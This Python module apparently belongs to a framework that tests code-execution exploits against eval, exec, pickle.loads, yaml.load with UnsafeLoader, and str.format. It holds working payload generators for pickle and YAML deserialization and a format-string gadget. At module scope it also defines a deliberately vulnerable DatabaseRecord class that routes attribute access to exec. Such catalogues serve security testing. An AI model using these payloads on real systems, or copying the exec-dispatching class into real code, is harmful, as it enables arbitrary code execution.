import builtins
import pickle
import subprocess
from pathlib import Path
from typing import Callable

import yaml

from .execution_base import Exploit


class SimplePythonExploit(Exploit):
    category_name = "Simple Python Code Execution"

    def generate_payload(source_code: str) -> str:
        return source_code


class EvalExploit(SimplePythonExploit):
    vulnerable_function = builtins.eval

    def run_payload(payload: str) -> None:
        eval(payload)


class ExecExploit(SimplePythonExploit):
    vulnerable_function = builtins.exec

    def run_payload(payload: str) -> None:
        exec(payload)


class PickleLoadsExploit(SimplePythonExploit):
    vulnerable_function = pickle.loads
    source = (
        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
    )

    def generate_payload(source_code: str) -> str:
        class Exploit(object):
            def __reduce__(self):
                return (eval, (source_code,))

        return pickle.dumps(Exploit())

    def run_payload(payload: str) -> None:
        obj = pickle.loads(payload)


class YamlLoadsExploit(SimplePythonExploit):
    vulnerable_function = yaml.load
    source = (
        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
    )
    notes = (
        "'load' without an explicit loader has been deperecated since 2020, "
        + "and now requires 'UnsafeLoader' for the exploit to work: "
        + "https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation"
    )

    def generate_payload(source_code: str) -> str:
        class Exploit(object):
            def __reduce__(self):
                return (eval, (source_code,))

        return yaml.dump(Exploit())

    def run_payload(payload: str) -> None:
        yaml.load(payload, Loader=yaml.UnsafeLoader)


class StringFormatExploit(SimplePythonExploit):
    vulnerable_function = "str.format"

    def generate_payload(source_code: str) -> str:
        encoded_source_code = "".join(["\\" + hex(ord(c))[1:] for c in source_code])
        return f"{{event.__init__.__globals__[record].exec(b'{encoded_source_code}')_send_command}}"

    def run_payload(payload: str) -> None:
        """Note that this exploit is enabled by the following code at the global scope:
        class DatabaseRecord:
            def cached(self, attribute):
                pass

            def from_database(self, attribute):
                pass

            def send_command(self, command):
                exec(command)

            def __getattr__(self, key):
                print(key)
                attr_name, state = key.split("_", 1)
                return getattr(self, state)(attr_name)

        record = DatabaseRecord()
        """

        class SomeObject(object):
            def __init__(self, value):
                self.value = value

        payload.format(event=SomeObject(1))


class DatabaseRecord:
    def cached(self, attribute):
        pass

    def from_database(self, attribute):
        pass

    def send_command(self, command):
        exec(command)

    def __getattr__(self, key):
        print(key)
        attr_name, state = key.split("_", 1)
        return getattr(self, state)(attr_name)


record = DatabaseRecord()
